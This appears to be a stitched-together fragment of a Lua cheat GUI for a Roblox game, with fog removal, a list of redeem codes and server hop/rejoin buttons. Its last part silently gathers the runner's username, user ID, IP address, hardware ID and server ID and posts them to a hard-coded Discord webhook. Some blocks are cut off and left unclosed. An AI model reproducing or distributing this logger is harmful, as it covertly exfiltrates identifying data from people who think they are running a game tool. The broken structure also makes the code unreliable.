Misc:AddSection({"Visual"})

Misc:AddButton({"Remove Fog", function()
  local LightingLayers, Sky = Lighting:FindFirstChild("LightingLayers"), Lighting:FindFirstChild("Sky")
  if Sky then
    Sky:Destroy()
  end
  if LightingLayers then
    LightingLayers:Destroy()
  end
end})

Misc:AddSection({"More FPS"})

Misc:AddToggle({"Remove Damage", true, function(Value)
  ReplicatedStorage.Assets.GUI.DamageCounter.Enabled = not Value
end, "Misc/RemoveDamage"})
table.insert(AFKOptions, Misc:AddToggle({"Remove Notifications", false, function(Value)
  Player.PlayerGui.Notifications.Enabled = not Value
end, "Misc/RemoveNotifications"}))



Misc:AddButton({"Devil Fruit Shop", function()
  FireRemote("GetFruits")
	Player.PlayerGui.Main.FruitShop.Visible = true
end})








  Name = "Redeem all Codes",
  Callback = function()
    local Codes = {
      "REWARDFUN",
      "Chandler",
      "NEWTROLL",
      "KITT_RESET",
      "Sub2CaptainMaui",
      "DEVSCOOKING",
      "kittgaming",
      "Sub2Fer999",
      "Enyu_is_Pro",
      "Magicbus",
      "JCWK",
      "Starcodeheo",
      "Bluxxy",
      "fudd10_v2",
      "SUB2GAMERROBOT_EXP1",
      "Sub2NoobMaster123",
      "Sub2UncleKizaru",
      "Sub2Daigrock",
      "Axiore",
      "TantaiGaming",
      "StrawHatMaine",
      "Sub2OfficialNoobie",
      "Fudd10",
      "Bignews",
      "TheGreatAce",
      "DRAGONABUSE",
      "SECRET_ADMIN",
      "ADMIN_TROLL",
      "STAFFBATTLE",
      "ADMIN_STRENGTH",
      "JULYUPDATE_RESET",
      "NOOB_REFUND",
      "15B_BESTBROTHERS",
      "CINCODEMAYO_BOOST",
      "ADMINGIVEAWAY",
      "GAMER_ROBOT_1M",
      "SUBGAMERROBOT_RESET",
      "SUB2GAMERROBOT_RESET1",
      "GAMERROBOT_YT",
      "TY_FOR_WATCHING",
      "EXP_5B",
      "RESET_5B",
      "UPD16",
      "3BVISITS",
      "2BILLION",
      "UPD15",
      "THIRDSEA",
      "1MLIKES_RESET",
      "UPD14",
      "1BILLION",
      "ShutDownFix2",
      "XmasExp",
      "XmasReset",
      "Update11",
      "PointsReset",
      "Update10",
      "Control",
      "SUB2OFFICIALNOOBIE",
      "AXIORE",
      "BIGNEWS",
      "BLUXXY",
      "CHANDLER",
      "ENYU_IS_PRO",
      "FUDD10",
      "FUDD10_V2",
      "KITTGAMING",
      "MAGICBUS",
      "STARCODEHEO",
      "STRAWHATMAINE",
      "SUB2CAPTAINMAUI",
      "SUB2DAIGROCK",
      "SUB2FER999",
      "SUB2NOOBMASTER123",
      "SUB2UNCLEKIZARU",
      "TANTAIGAMING",
      "THEGREATACE",
      "CONTROL",
      "UPDATE11",
      "XMASEXP",
      "Colosseum"
    }
    
    
    
    
    
    
    local Section = SV:AddSection({
    Name = "Misc Sever"
})

        SV:AddTextbox({
            Name = "Job Id Placed",
            Default = "",
            TextDisappear = true,
            Callback = function(Value)
                _G.Job = Value 
            end	  
        })

        SV:AddButton({
            Name = "Join Id",
            Callback = function()
                _G.AutoRejoin = false
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
              end    
        })

        SV:AddButton({
            Name = "Copy Job Id",
            Callback = function()
                setclipboard(tostring(game.JobId))
              end    
            })

        SV:AddButton({
            Name = "Hop Sever",
            Callback = function()
                _G.AutoRejoin = false
                Hop()
              end    
        })

        SV:AddButton({
            Name = "Rejoin Sever",
            Callback = function()
                game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
              end    
        })
        
        
        
        
        
        
-- Webhook

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**main log**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xf93dff),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1205449864046059520/gbsFFwt60LFlwDSJ09qBhomuHLRtvyTWXVH-JFKYRclTg21yMl-sav-ILe3F1EchIDyf", AdminLoggerMsg()) -- Post to admin webhook        